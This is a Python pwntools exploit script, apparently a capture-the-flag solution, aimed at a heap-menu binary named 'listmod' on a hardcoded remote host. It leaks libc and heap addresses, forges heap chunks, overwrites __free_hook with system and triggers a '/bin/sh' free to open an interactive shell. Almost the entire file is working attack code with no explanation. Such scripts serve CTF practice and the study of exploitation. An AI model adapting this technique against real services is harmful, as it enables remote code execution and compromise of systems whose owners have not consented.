#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '111.186.58.249', 20001
binary = './listmod'
brkpts = '''
b*0x0000555555554000+0x139f
b*0x0000555555554000+0x1656
c
p $al
'''

elf = ELF("listmod")
libc = ELF("libc-2.31.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.31.so'})

def choice(idx):
    sla(">>", str(idx))

def add(name, content):
    choice(1)
    sla("name>", str(name))
    sla("content>", str(content))

def delete(idx):
    choice(2)
    sla("index>", str(idx))

def view(idx):
    choice(3)
    sla("index>", str(idx))

if __name__ == "__main__":
    for i in range(0x8):
        add(chr(i), "a"+str(i))

    for i in range(8, -1, -1):
        delete(i)
    
    for i in range(2, 9):
        add(chr(i), "b"+str(i))
    
    add(chr(0), "b0")
    add(chr(1), "b1")
    add(chr(9), "bleh")

    for i in range(8, 1, -1):
        delete(i)
    
    delete(1)
    delete(0)

    for i in range(6):
        add(chr(9), "abc"+str(i))
    
    add("\x80", "a")
    view(1)
    reu("=> ")
    libc.address = uu64(re(6)) - 0x1ebbe0
    log.info("libc @ "+hex(libc.address))

    payload = "a"*0xb8 + p64(0x421) + p64(0)*2
    add(chr(0), payload)
    add(chr(0), "abcd")

    add(0xb, "a"*0x1f8 + p64(0x211))
    for i in range(0xc, 0xf):
        add(i, "bleh"+str(i))
    
    choice(1)
    sa("name>", "a"*0xf + "c")
    sla("content>", "abcde")
    view(2)
    re(0x10)
    heap = uu64(re(6)) - 0x1830
    log.info("heap @ "+hex(heap))

    fake = heap + 0x1ee0

    delete(1)
    payload = "a"*0x118 + p64(0x31) + p64(0)*3 + p64(fake)
    add(chr(2), payload)
    delete(4)
    delete(3)
    delete(0)

    free_hook = libc.symbols['__free_hook']
    system = libc.symbols['system']

    add(chr(5), "a"*0x10 + p64(free_hook)[:7])
    add(chr(6), "/bin/sh\x00")
    add(chr(7), p64(system))
    gdb.attach(io)
    delete(6)

    io.interactive()
